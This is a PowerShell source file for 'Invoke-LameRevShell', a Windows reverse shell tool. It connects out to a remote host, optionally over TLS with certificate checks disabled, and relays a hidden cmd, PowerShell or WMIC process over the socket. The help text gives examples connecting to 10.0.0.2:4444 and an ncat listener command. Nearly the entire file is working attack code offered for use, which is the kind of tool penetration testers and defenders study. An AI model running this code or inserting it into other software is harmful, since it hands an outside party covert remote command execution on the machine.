function Invoke-LameRevShell {
    <#
        .SYNOPSIS
            Invoke-LameRevShell - Reverse Shell for Windows with full STDOUT and STDERR redirection
            Author: lamesecguy
            License: BSD 3-Clauses
            Source: https://github.com/lamesecguy/LameRevShells
        
        .DESCRIPTION
            Invoke-LameRevShell - Reverse Shell for Windows with full STDOUT and STDERR redirection
            
            Creates a local shell process, establishes a reverse connection, sends any user input to the local shell, and redirects fully both the Standard Output and the Standard Error streams from the local shell back to the remote receiver. That means the output on the remote receiver should be exactly the same as it would be on the local shell.
            
            The receiver can be any netcat-like application that listens for a TCP connection, sends whatever is typed in the terminal and prints whatever is received on the screen.
            
            It is possible to have the reverse shell data tunneled with TLS. For example, The "ncat" tool supports natively listening to encrypted connections:
                ncat --ssl -lnp 4444
            
            
        .PARAMETER RemoteHost
            Remote host to receive the connection
        .PARAMETER RemotePort
            Remote port to receive the connection
        .PARAMETER Binary
            Binary to be executed and redirected
            Default: "powershell.exe"
        .PARAMETER Encrypt
            Encrypt the reverse TCP connection
            Default: "false"
            
        .EXAMPLE  
            PS C:\> Invoke-LameRevShell 10.0.0.2 4444 cmd.exe
            
            Description
            -----------
            Invoke a CMD reverse shell
            
        .EXAMPLE
            PS C:\> Invoke-LameRevShell -RemoteHost 10.0.0.2 -RemotePort 4444 -Binary wmic.exe
            
            Description
            -----------
            Invoke a WMIC reverse shell
            
         .EXAMPLE
            PS C:\> Invoke-LameRevShell -RemoteHost 10.0.0.2 -RemotePort 4444 -Binary powershell.exe -Encrypt
            
            Description
            -----------
            Invoke a powershell reverse shell with an encrypted connection
            
    #>
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $RemoteHost,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $RemotePort,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Binary = "powershell.exe",

        [Parameter(Position = 3, Mandatory = $False)]
        [Switch]
        $Encrypt = $False
    )
    
    $NetSocket = New-Object System.Net.Sockets.TcpClient($RemoteHost, $RemotePort)
    If ($Encrypt) {
        $ClrStream = $NetSocket.GetStream()
        $NetStream = New-Object System.Net.Security.SslStream($ClrStream, $False, ({$True} -as [System.Net.Security.RemoteCertificateValidationCallback]))
        $NetStream.AuthenticateAsClient($Null)
    } Else {
        $NetStream = $NetSocket.GetStream()
    }
    
    $NetReader = New-Object System.IO.StreamReader($NetStream)
    $NetWriter = New-Object System.IO.StreamWriter($NetStream)
    $NetWriter.AutoFlush = $True
    
    $CmdObject = New-object System.Diagnostics.ProcessStartInfo($Binary)
    $CmdObject.CreateNoWindow = $True
    $CmdObject.UseShellExecute = $False
    $CmdObject.RedirectStandardInput = $True
    $CmdObject.RedirectStandardOutput = $True
    $CmdObject.RedirectStandardError = $True
    
    $CmdBGTask = New-Object System.Diagnostics.Process
    $CmdBGTask.StartInfo = $CmdObject
	$CmdBGTask.Start() | Out-Null
    
    $CmdReader = $CmdBGTask.StandardOutput
    $CmdErrors = $CmdBGTask.StandardError
    $CmdWriter = $CmdBGTask.StandardInput
    $CmdWriter.AutoFlush = $True
    
    $NTCMMutex = New-Object System.Threading.Mutex($False)
    
    $Net2CmdBS = {
        Param ($Blk1Reader, $Blk1Writer)
        While ($True) {
            $Blk1Writer.WriteLine($Blk1Reader.ReadLine())
        }
    }
    
    $Cmd2NetBS = {
        Param ($Blk2Reader, $Blk2Writer, $Blk2Mutex)
        While ($True) {
            $ChrSTDOUT = $Blk2Reader.Read()
            $Blk2Mutex.WaitOne()
            While ($True) {
                $Blk2Writer.Write([char]$ChrSTDOUT)
                If ($Blk2Reader.Peek() -eq -1) { Break }
                $ChrSTDOUT = $Blk2Reader.Read()
            }
            $Blk2Mutex.ReleaseMutex()
        }
    }
    
    $PSObjects = @()
    0..2 | % {
        $PSObjects += [Powershell]::Create()
        $PSObjects[$_].runspace = [RunSpaceFactory]::CreateRunspace()
        $PSObjects[$_].runspace.Open()
    }
    
    [void]$PSObjects[0].AddScript($Net2CmdBS).AddParameters(@{Blk1Reader = $NetReader; Blk1Writer = $CmdWriter})
    [void]$PSObjects[1].AddScript($Cmd2NetBS).AddParameters(@{Blk2Reader = $CmdReader; Blk2Writer = $NetWriter; Semaphore = $NTCMMutex})
    [void]$PSObjects[2].AddScript($Cmd2NetBS).AddParameters(@{Blk2Reader = $CmdErrors; Blk2Writer = $NetWriter; Semaphore = $NTCMMutex})
    
    $PSObjects | % { $_.BeginInvoke() | Out-Null }
    
    do { Sleep 2 } While ($NetSocket.Connected -and (-not $CmdBGTask.HasExited))
    
    try { $NetSocket.Close() } catch { $True }
    try { $CmdBGTask.Kill() } catch { $True }
    $PSObjects | % { try { $_.Dispose() } catch { $True } }
}

